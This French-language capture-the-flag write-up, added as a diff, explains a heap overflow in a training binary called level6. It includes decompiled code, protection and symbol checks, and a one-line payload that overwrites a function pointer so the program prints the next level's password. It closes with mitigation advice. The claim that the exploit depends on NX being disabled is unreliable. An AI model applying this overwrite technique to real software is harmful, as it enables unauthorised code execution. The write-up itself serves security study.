@@ -1,0 +1,120 @@
+# Exploitation de Heap Overflow - Level6
+
+## Analyse du Programme
+
+Le programme présente une vulnérabilité de heap overflow. Voici le code source principal :
+
+```c
+void main(undefined4 param_1, int param_2) {
+    char *__dest;
+    undefined4 *puVar1;
+    
+    __dest = (char *)malloc(0x40);    // Allocation de 64 bytes
+    puVar1 = (undefined4 *)malloc(4);  // Allocation de 4 bytes
+    *puVar1 = m;                      // Stockage de l'adresse de la fonction m
+    strcpy(__dest, *(char **)(param_2 + 4));  // Copie de l'argument sans vérification
+    (*(code *)*puVar1)();             // Appel de la fonction pointée
+    return;
+}
+```
+
+## Points Clés de Théorie
+
+1. **Vulnérabilité Heap Overflow**
+   - Utilisation de `strcpy` sans vérification de taille
+   - Possibilité d'écraser la mémoire allouée
+   - Permet de modifier le pointeur de fonction
+
+2. **Allocation Mémoire**
+   - Premier malloc : 0x40 (64) bytes
+   - Deuxième malloc : 4 bytes
+   - Les blocs sont contigus en mémoire
+
+3. **Techniques d'Exploitation**
+   - Overflow du premier bloc pour écraser le second
+   - Modification du pointeur de fonction
+   - Redirection vers la fonction n qui affiche le mot de passe
+
+## Étapes de l'Exploitation
+
+### 1. Analyse du Programme
+
+```bash
+# Vérification des protections
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
+```
+
+### 2. Recherche des Adresses
+
+```bash
+# Recherche de l'adresse de la fonction n
+objdump -t level6 | grep n
+# Résultat : 08048454 g     F .text  00000014              n
+```
+
+### 3. Détermination de l'Offset
+
+L'offset de 72 bytes est nécessaire pour l'exploitation. Ce nombre est supérieur à la somme des allocations (64 + 4 = 68) à cause de :
+- L'alignement mémoire (padding)
+- Les en-têtes de gestion du heap
+- La structure interne des blocs malloc
+
+### 4. Construction de l'Exploit
+
+```bash
+./level6 $(python -c'print("A"*72 + "\x54\x84\x04\x08")')
+```
+
+Décomposition de l'exploit :
+- "A"*72 : Remplissage jusqu'à l'overflow
+- "\x54\x84\x04\x08" : Adresse de la fonction n en little-endian
+
+## Explication Technique Détaillée
+
+### Structure de la Mémoire
+
+```
++------------------+
+| Premier malloc   | 64 bytes
+| (__dest)         |
++------------------+
+| Deuxième malloc  | 4 bytes
+| (puVar1)         |
++------------------+
+```
+
+### Processus d'Exploitation
+
+1. **Allocation Mémoire**
+   - Premier bloc : 64 bytes pour la chaîne
+   - Deuxième bloc : 4 bytes pour le pointeur de fonction
+
+2. **Overflow**
+   - Écriture de 72 bytes au lieu de 64
+   - Les 8 bytes supplémentaires écrasent :
+     * L'en-tête du deuxième bloc
+     * Le pointeur de fonction
+
+3. **Redirection**
+   - Remplacement de l'adresse de m par celle de n
+   - L'appel de fonction exécute n au lieu de m
+
+## Sécurité
+
+Cette vulnérabilité illustre l'importance de :
+- Utiliser des fonctions sécurisées (strncpy au lieu de strcpy)
+- Vérifier les tailles des buffers
+- Protéger les pointeurs de fonction
+- Activer les protections comme :
+  - ASLR
+  - NX
+  - Canary
+  - RELRO
+
+## Notes Techniques
+
+- Le programme nécessite au moins un argument pour éviter le segfault
+- L'offset de 72 bytes est dû à l'alignement mémoire et aux en-têtes du heap
+- La fonction n affiche le mot de passe de level7
+- L'exploitation est possible car NX est désactivé
